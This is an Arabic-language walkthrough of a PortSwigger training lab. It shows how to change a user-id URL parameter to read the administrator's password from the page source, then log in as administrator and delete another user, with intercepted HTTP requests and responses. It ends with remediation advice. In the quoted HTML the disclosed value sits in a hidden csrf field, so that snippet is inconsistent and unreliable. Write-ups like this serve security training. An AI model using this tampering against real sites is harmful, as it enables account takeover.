# [User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)

## **`الهدف`**
الحصول على كلمة مرور المسئول `administrator` ومن ثم حذف حساب `carlos`
## **`خطوات الحل`**
الحل الرسمي الموجود على موقع `PortSwigger` هو الدخول إلى حساب `wiener:peter`، وتغير الـ `ID` في الـ `URL` من `wiener` إلى `administrator` 
```URL
https://0ae5007303b77884807a67ec000c0029.web-security-academy.net/my-account?id=administrator
```

وبعد ذلك نعترض الـ `response` لنجد أن كلمة المرور ظاهرة لدينا بداخله `value="lyxnOMTOwdAtTYISfxtU9u1OMkZfD0Vr"` فنقوم بنسخها وعمل `Log out` 
وتسجيل الدخول إلى حساب `administrator`، 
وبعد ذلك نتوجه إلى لوحة التحكم ونقوم بحذف `carlos` لننتهي من حل اللاب.

**`لكن الحل الذي قُمت به أعقد قليًلا لأني لم أجرب الطريقة الأولى`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتغيير الـ `Email` واعتراض الـ `response`  الأول 

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

ونغير الـ `id=wiener` إلى `administrator` ونمرره
```http
HTTP/2 302 Found
Location: /my-account?id=administrator
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

**`ملاحظة:`** بدلًا من اعتراض الـ `response` يُمكن أن نعترض الـ `request` الثاني الذي يحدث تلقائيًا ونغير الـ `id=wiener` إلى `administrator` ونمرره
```http
GET /my-account?id=administrator HTTP/2
Host: 0ae5007303b77884807a67ec000c0029.web-security-academy.net
Cookie: session=iFgDZu30ENIt8ebKAJONR5a2NBYs4S06
```

وبعد ذلك نقوم باعتراض الـ `responese` التالي الذي للـ `request` الذي يحدث تلقائيًا
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 7168

<!DOCTYPE html>
<html>

                        </form>
                        <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="lyxnOMTOwdAtTYISfxtU9u1OMkZfD0Vr">
                            <input required type=password name=password value='123'/>
                            <button class='button' type='submit'> Update password </button>
<html>
```

لنجد أن كلمة المرور ظاهرة لدينا `value="lyxnOMTOwdAtTYISfxtU9u1OMkZfD0Vr"` فنقوم بنسخها وعمل `Log out` وتسجيل الدخول إلى حساب `administrator`، وبعد ذلك نتوجه إلى لوحة التحكم ونقوم بحذف `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`الترقيع هو جزء كبير من ترقيع لاب` [User ID controlled by request parameter](./User-ID-controlled-by-request-parameter.md)

بالإضاة إلى أنه لا يجب على السيرفر أبدًا أن يُرسل كلمة المرور الحالية وعند تصميم صفحة تغيير كلمة المرور، يجب إرسال حقول فارغة ليقوم المُستخدم بكتابة الكلمة الجديدة فيها، دون الحاجة لاستدعاء الكلمة القديمة وعرضها في الـ `Source code` الخاص بالصفحة.
